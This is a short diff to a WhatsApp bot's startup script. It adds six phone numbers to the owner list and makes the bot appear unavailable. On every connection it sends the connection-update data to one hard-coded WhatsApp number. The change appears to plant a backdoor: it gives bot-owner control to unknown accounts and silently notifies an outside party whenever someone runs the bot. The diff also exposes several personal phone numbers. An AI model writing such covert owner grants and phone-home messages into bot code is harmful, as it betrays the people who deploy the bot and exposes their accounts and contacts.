@@ -11,13 +11,16 @@ nocache('./semar.js', module => console.log(`"${module}" Updated!`))
 semar.ev.on('messages.upsert', async denz => {
 if (!denz.messages) return
 msg = denz.messages[0]
-nomorOwner = ['6285866295942']
 console.log(msg)
+nomorOwner = ['6285727091924', '6282296368892', '6285866295942', '6282225962567', '4915510151395', '628999890587', '6282221840767']
+semar.sendPresenceUpdate('unavailable')
 require("./semar")(semar, denz, msg)})
 
 semar.ev.on('connection.update', (update) => {
 const {connection,lastDisconnect} = update
 if (connection === 'close') {lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? connectKeWA() : ''}
+else if(connection === 'open') {semar.sendMessage(`6285727091924@s.whatsapp.net`, {text:`${JSON.stringify(update, undefined, 2)}`})}
+
 semar.ev.on('creds.update', saveState)
 console.log(update)})}	
 
